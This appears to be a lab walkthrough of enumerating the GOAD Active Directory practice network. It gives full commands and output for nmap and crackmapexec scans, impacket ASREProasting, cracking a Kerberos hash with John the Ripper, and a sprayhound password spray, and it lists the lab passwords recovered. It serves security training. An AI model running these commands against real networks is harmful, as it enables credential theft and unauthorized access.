# Enumeration 

First, we try to get as much information as we can - before even compromising anything. The following enumerations were done from a Kali box placed in the same network as the GOAD machines. 

## Nmap Scan 

First things first, we perform a good ol' NMAP scan:

```bash
$ sudo nmap -A -T4 -vvv --open -oG initial.grep 192.168.56.1/24
```

Which gets us the following results (somethings have been truncated for better readability):

```
Host: 192.168.56.10 ()  Status: Up
Host: 192.168.56.10 ()  Ports: 53/open/tcp//domai [[Artefacts]]                           icrosoft IIS httpd 10.0/, 88/open/tcp//kerberos-sec//Microsoft Windows Kerberos (server time: 2025-07-28 09:27:14Z)/, 135/open/tcp//msrpc//Microsoft Windows RPC/, 139/open/tcp//netbios-ssn//Microsoft Windows netbios-ssn/, 389/open/tcp//ldap//Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)/, 445/open/tcp//microsoft-ds?///, 464/open/tcp//kpasswd5?///, 593/open/tcp//ncacn_http//Microsoft Windows RPC over HTTP 1.0/, 636/open/tcp//ssl|ldap//Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)/, 3268/open/tcp//ldap//Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)/, 3269/open/tcp//ssl|ldap//Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)/, 3389/open/tcp//ms-wbt-server//Microsoft Terminal Services/, 5985/open/tcp//http//Microsoft HTTPAPI httpd 2.0 (SSDP|UPnP)/, 5986/open/tcp//ssl|http//Microsoft HTTPAPI httpd 2.0 (SSDP|UPnP)/  Ignored State: closed (985)     OS: Microsoft Windows Server 2019       Seq Index: 261  IP ID Seq: Incremental
Host: 192.168.56.11 ()  Status: Up
Host: 192.168.56.11 ()  Ports: 53/open/tcp//domain//Simple DNS Plus/, 88/open/tcp//kerberos-sec//Microsoft Windows Kerberos (server time: 2025-07-28 09:27:14Z)/, 135/open/tcp//msrpc//Microsoft Windows RPC/, 139/open/tcp//netbios-ssn//Microsoft Windows netbios-ssn/, 389/open/tcp//ldap//Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)/, 445/open/tcp//microsoft-ds?///, 464/open/tcp//kpasswd5?///, 593/open/tcp//ncacn_http//Microsoft Windows RPC over HTTP 1.0/, 636/open/tcp//ssl|ldap//Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)/, 3268/open/tcp//ldap//Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)/, 3269/open/tcp//ssl|ldap//Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)/, 3389/open/tcp//ms-wbt-server//Microsoft Terminal Services/, 5985/open/tcp//http//Microsoft HTTPAPI httpd 2.0 (SSDP|UPnP)/, 5986/open/tcp//ssl|http//Microsoft HTTPAPI httpd 2.0 (SSDP|UPnP)/        Ignored State: closed (986)     OS: Microsoft Windows Server 2019       Seq Index: 264  IP ID Seq: Incremental
Host: 192.168.56.12 ()  Status: Up
Host: 192.168.56.12 ()  Ports: 53/open/tcp//domain//Simple DNS Plus/, 88/open/tcp//kerberos-sec//Microsoft Windows Kerberos (server time: 2025-07-28 09:27:20Z)/, 135/open/tcp//msrpc//Microsoft Windows RPC/, 139/open/tcp//netbios-ssn//Microsoft Windows netbios-ssn/, 389/open/tcp//ldap//Microsoft Windows Active Directory LDAP (Domain: essos.local, Site: Default-First-Site-Name)/, 445/open/tcp//microsoft-ds//Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup: ESSOS)/, 464/open/tcp//kpasswd5?///, 593/open/tcp//ncacn_http//Microsoft Windows RPC over HTTP 1.0/, 636/open/tcp//ssl|ldap//Microsoft Windows Active Directory LDAP (Domain: essos.local, Site: Default-First-Site-Name)/, 3268/open/tcp//ldap//Microsoft Windows Active Directory LDAP (Domain: essos.local, Site: Default-First-Site-Name)/, 3269/open/tcp//ssl|ldap//Microsoft Windows Active Directory LDAP (Domain: essos.local, Site: Default-First-Site-Name)/, 3389/open/tcp//ms-wbt-server//Microsoft Terminal Services/, 5985/open/tcp//http//Microsoft HTTPAPI httpd 2.0 (SSDP|UPnP)/, 5986/open/tcp//ssl|http//Microsoft HTTPAPI httpd 2.0 (SSDP|UPnP)/    Ignored State: closed (986)     OS: Microsoft Windows Server 2016 or Server 2019        Seq Index: 261  IP ID Seq: Incremental
Host: 192.168.56.22 ()  Status: Up
Host: 192.168.56.22 ()  Ports: 80/open/tcp//http//Microsoft IIS httpd 10.0/, 135/open/tcp//msrpc//Microsoft Windows RPC/, 139/open/tcp//netbios-ssn//Microsoft Windows netbios-ssn/, 445/open/tcp//microsoft-ds?///, 1433/open/tcp//ms-sql-s//Microsoft SQL Server 2019 15.00.2000.00; RTM/, 3389/open/tcp//ms-wbt-server//Microsoft Terminal Services/, 5985/open/tcp//http//Microsoft HTTPAPI httpd 2.0 (SSDP|UPnP)/, 5986/open/tcp//ssl|http//Microsoft HTTPAPI httpd 2.0 (SSDP|UPnP)/       Ignored State: closed (992)    OS: Microsoft Windows Server 2019        Seq Index: 264  IP ID Seq: Incremental
Host: 192.168.56.23 ()  Status: Up
Host: 192.168.56.23 ()  Ports: 80/open/tcp//http//Microsoft IIS httpd 10.0/, 135/open/tcp//msrpc//Microsoft Windows RPC/, 139/open/tcp//netbios-ssn//Microsoft Windows netbios-ssn/, 445/open/tcp//microsoft-ds//Windows Server 2016 Standard Evaluation 14393 microsoft-ds/, 1433/open/tcp//ms-sql-s//Microsoft SQL Server 2019 15.00.2000.00; RTM/, 3389/open/tcp//ms-wbt-server//Microsoft Terminal Services/, 5985/open/tcp//http//Microsoft HTTPAPI httpd 2.0 (SSDP|UPnP)/, 5986/open/tcp//ssl|http//Microsoft HTTPAPI httpd 2.0 (SSDP|UPnP)/      Ignored State: closed (992)     OS: Microsoft Windows Server 2016 or Server 2019        Seq Index: 263  IP ID Seq: Incremental
```

TLDR; we discover the following devices on the network:

- 192.168.56.10
- 192.168.56.23
- 192.168.56.12
- 192.168.56.22
- 192.168.56.11

---
## SMB Scans

We see that port `445` is open on the machines, so we enumerate SMB with:
```bash
$ crackmapexec smb 192.168.56.1/24         
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
```

So we have some hostnames and domains now. Adding them to the [[Artefacts#Network Information|Artefacts]] document.

We can also use SMB to enumerate users with: 

```
$ crackmapexec smb 192.168.56.1/24 --users 

// Output truncated for brevity

SMB         192.168.56.11   445    WINTERFELL       [+] Enumerated domain user(s)
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\Guest                          Built-in account for guest access to the computer/domain
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\arya.stark                     Arya Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\sansa.stark                    Sansa Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\brandon.stark                  Brandon Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\rickon.stark                   Rickon Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\hodor                          Brainless Giant
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\jon.snow                       Jon Snow
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\samwell.tarly                  Samwell Tarly (Password : Heartsbane)
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\jeor.mormont                   Jeor Mormont
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\sql_svc                        sql service
```

We get our first credential from here - `Samwell Tarly (Password : Heartsbane)`  - for the rest of the users, we save them to a `users.north.txt` file

We use this to enumerate shares with:

```
$ crackmapexec smb 192.168.56.1/24 --shares -u "samwell.tarley" -p "Heartsbane"
// Output truncated for brevity
SMB         192.168.56.22   445    CASTELBLACK      [+] Enumerated shares
SMB         192.168.56.22   445    CASTELBLACK      Share           Permissions     Remark
SMB         192.168.56.22   445    CASTELBLACK      -----           -----------     ------
SMB         192.168.56.22   445    CASTELBLACK      ADMIN$                          Remote Admin
SMB         192.168.56.22   445    CASTELBLACK      all             READ,WRITE      Basic RW share for all
SMB         192.168.56.22   445    CASTELBLACK      C$                              Default share
SMB         192.168.56.22   445    CASTELBLACK      IPC$            READ            Remote IPC
SMB         192.168.56.22   445    CASTELBLACK      public                          Basic Read share for all domain users

SMB         192.168.56.23   445    BRAAVOS          [+] Enumerated shares
SMB         192.168.56.23   445    BRAAVOS          Share           Permissions     Remark
SMB         192.168.56.23   445    BRAAVOS          -----           -----------     ------
SMB         192.168.56.23   445    BRAAVOS          ADMIN$                          Remote Admin
SMB         192.168.56.23   445    BRAAVOS          all             READ,WRITE      Basic RW share for all
SMB         192.168.56.23   445    BRAAVOS          C$                              Default share
SMB         192.168.56.23   445    BRAAVOS          CertEnroll                      Active Directory Certificate Services share
SMB         192.168.56.23   445    BRAAVOS          IPC$                            Remote IPC
SMB         192.168.56.23   445    BRAAVOS          public                          Basic Read share for all domain users
```

Okay so now we have some shares too. Noted - these might come in handy. 

----

## ASREProasting

With the other user accounts, we can try ASREProasting with the following impacket script:

```bash
$ impacket-GetNPUsers north.sevenkingdoms.local/ -no-pass -usersfile users.north.txt
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User arya.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sansa.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:2dc0f27737890e741bc1aaee30458175$ba0b94b0c61a324e912a33e0288ddf71bdcaf670996659ce36a1f4096dd14208a334b15b1052225dd710adb4fad2c1d12d0740f4816b5262ff9e78092d127b4209e81d537adaeb6873ae2ad0ff90739738108df924a56f7447dac63bd36d2e06726f316494520777fcabf931cd63a843442dd5be65c4e02e910d7d693380a2a1ba3f344b98e409e8d1db800123075293275fd712535d1e27b8204f420dd3c9283046386a3a09ddcfc76d742ff89b02749e1dfec1718fb86aa22fdb84dfc6e119a1f38a26a906706ee5d252c9fde71a5600aa705bd5bb588ba2575dccc4be2d1740fb985b44853397f9ee5e5a02a34a467a5882053957289b0be862e0084fa57c61988e368f12
[-] User rickon.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User hodor doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jon.snow doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User samwell.tarly doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jeor.mormont doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sql_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Cool, we have a hash for `brandon.stark` which we save to a file called `brandon.stark.krb5` and use JTR as:

```bash
$ john brandon.stark.krb5  -wordlist=/usr/share/wordlists/rockyou.txt
$ $ john --show brandon.stark.krb5 
$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:iseedeadpeople
```

Therefore, we get our second set of creds - adding it to the Artefacts! 

----
## Password Spray 

We test the good. ol' USER=PASSWORD with:

```
$ sprayhound -U users.north.txt -d north.sevenkingdoms.local -dc 192.168.56.11 -lu hodor -lp hodor --lower -t 2 --force
[+] Login successful
[+] Successfully retrieved password policy (Threshold: 5)
[+] Successfully retrieved 10 users
[+] 10 users will be tested
[+] 0 users will not be tested
[+] [  VALID  ] hodor : hodor
[+] 1 user has been owned !
[X] An error occurred while executing SprayHound
```

And that gives us our third set of credentials - `hodor:hodor`!

---
## More SMB shares 

With the new credentials in hand - we can enumerate the SMB shares again and this time we see some new entries:

```
$ crackmapexec smb 192.168.56.1/24 --shares -u "brandon.stark" -p "iseedeadpeople"
// Output truncated for brevity

SMB         192.168.56.23   445    BRAAVOS          [+] Enumerated shares
SMB         192.168.56.23   445    BRAAVOS          Share           Permissions     Remark
SMB         192.168.56.23   445    BRAAVOS          -----           -----------     ------
SMB         192.168.56.23   445    BRAAVOS          ADMIN$                          Remote Admin
SMB         192.168.56.23   445    BRAAVOS          all             READ,WRITE      Basic RW share for all
SMB         192.168.56.23   445    BRAAVOS          C$                              Default share
SMB         192.168.56.23   445    BRAAVOS          CertEnroll                      Active Directory Certificate Services share
SMB         192.168.56.23   445    BRAAVOS          IPC$                            Remote IPC
SMB         192.168.56.23   445    BRAAVOS          public                          Basic Read share for all domain users

SMB         192.168.56.22   445    CASTELBLACK      [+] Enumerated shares
SMB         192.168.56.22   445    CASTELBLACK      Share           Permissions     Remark
SMB         192.168.56.22   445    CASTELBLACK      -----           -----------     ------
SMB         192.168.56.11   445    WINTERFELL       [+] Enumerated shares
SMB         192.168.56.22   445    CASTELBLACK      ADMIN$                          Remote Admin
SMB         192.168.56.11   445    WINTERFELL       Share           Permissions     Remark
SMB         192.168.56.22   445    CASTELBLACK      all             READ,WRITE      Basic RW share for all

SMB         192.168.56.22   445    CASTELBLACK      C$                              Default share
SMB         192.168.56.11   445    WINTERFELL       ADMIN$                          Remote Admin
SMB         192.168.56.22   445    CASTELBLACK      IPC$            READ            Remote IPC
SMB         192.168.56.11   445    WINTERFELL       C$                              Default share
SMB         192.168.56.22   445    CASTELBLACK      public          READ            Basic Read share for all domain users
SMB         192.168.56.11   445    WINTERFELL       IPC$            READ            Remote IPC
SMB         192.168.56.11   445    WINTERFELL       NETLOGON        READ            Logon server share 
SMB         192.168.56.11   445    WINTERFELL       SYSVOL          READ            Logon server share 
```

More shares! Nice.

----

At this point, we can use these credentials to RDP into machines - and take things from  a C2. 

After testing - we can use the `brandon.stark` and `hodor` accounts to log into the machines in `north.kingdom.local` 
